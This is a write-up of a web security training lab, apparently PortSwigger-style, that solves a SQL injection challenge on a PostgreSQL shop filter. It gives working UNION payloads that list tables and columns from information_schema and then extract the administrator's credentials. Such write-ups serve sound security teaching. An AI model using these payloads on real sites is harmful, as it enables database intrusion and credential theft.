# Lab: SQL injection attack, listing the database contents on non-Oracle databases
## Task
This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

## Solution
### Exploit
Steps to explore the number of columns returned in the response as well as which column is string-compatible are the same as previous labs.  

To check which database it is, I queried the version of the database and the one of PostgreSql works, which means this database is PostgreSql.  

![image](https://user-images.githubusercontent.com/44528004/130075282-43dff783-130b-4aa5-ba5a-8855f2c60e88.png)


To view all table names, the payload is:
```
/filter?category=Pets'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```

As the result, the table that is likely to contain `username` and `password` is `users_erggze`:  

![image](https://user-images.githubusercontent.com/44528004/130074155-4594456b-6697-4c6f-a675-277074fc68f8.png)  

Then, to explore the column names in the `users_erggze` table, the payload is:
```
/filter?category=Pets'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_erggze'--
```

In the response, the columns that contain `username` and `password` are `username_kaddvg` and `password_gtnezs` :  

![image](https://user-images.githubusercontent.com/44528004/130074473-8a0b61f1-8855-4743-94d3-e32fc0492578.png)

To retrieve the password of the `administrator` user, the following payload is used:
```
/filter?category=Pets'+UNION+SELECT+username_kaddvg,password_gtnezs+FROM+users_erggze+WHERE+username_kaddvg='administrator'--
```

![image](https://user-images.githubusercontent.com/44528004/130074809-af78354d-6b1e-4504-bb35-84dfe9508b68.png)

### Login
![image](https://user-images.githubusercontent.com/44528004/130074922-298ce292-30ad-4760-8cb7-2b18ebbfe6cf.png)  

![image](https://user-images.githubusercontent.com/44528004/130074982-13fca45d-8c3b-4917-8a2e-0f03c1be3a55.png)
> Solved!
